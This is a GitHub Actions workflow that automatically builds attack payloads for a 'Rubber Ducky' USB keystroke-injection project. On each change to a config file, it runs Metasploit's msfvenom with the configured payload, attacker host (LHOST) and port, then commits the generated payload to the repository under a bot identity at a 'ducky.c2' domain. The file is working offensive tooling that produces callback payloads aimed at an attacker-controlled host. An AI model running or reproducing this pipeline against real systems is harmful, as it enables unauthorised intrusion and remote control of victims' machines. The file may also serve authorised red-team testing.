name: Generate Payload

on:
  push:
    paths:
      - 'Rubber_Ducky/config/payload_config.json'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Read Configuration
        id: config
        run: |
          CONFIG=$(cat Rubber_Ducky/config/payload_config.json)
          echo "PAYLOAD=$(echo $CONFIG | jq -r .payload)" >> $GITHUB_OUTPUT
          echo "LHOST=$(echo $CONFIG | jq -r .lhost)" >> $GITHUB_OUTPUT
          echo "LPORT=$(echo $CONFIG | jq -r .lport)" >> $GITHUB_OUTPUT
          echo "FORMAT=$(echo $CONFIG | jq -r .format)" >> $GITHUB_OUTPUT

      - name: Create Output Directory
        run: mkdir -p Rubber_Ducky/payloads

      - name: Generate Payload (Docker)
        run: |
          echo "Pulling Metasploit Image..."
          docker pull metasploitframework/metasploit-framework
          
          echo "Running MSFVenom..."
          docker run --rm \
            -v "$PWD:/data" \
            metasploitframework/metasploit-framework \
            msfvenom -p ${{ steps.config.outputs.PAYLOAD }} \
            LHOST=${{ steps.config.outputs.LHOST }} \
            LPORT=${{ steps.config.outputs.LPORT }} \
            -f ${{ steps.config.outputs.FORMAT }} \
            -o /data/Rubber_Ducky/payloads/payload.${{ steps.config.outputs.FORMAT }}
          
          echo "Fixing permissions..."
          sudo chown -R $USER:$USER Rubber_Ducky/payloads

      - name: Commit and Push
        run: |
          git config --global user.name 'Ducky Bot'
          git config --global user.email 'bot@ducky.c2'
          git pull
          git add Rubber_Ducky/payloads/
          git commit -m "Generated payload: ${{ steps.config.outputs.PAYLOAD }}"
          git push
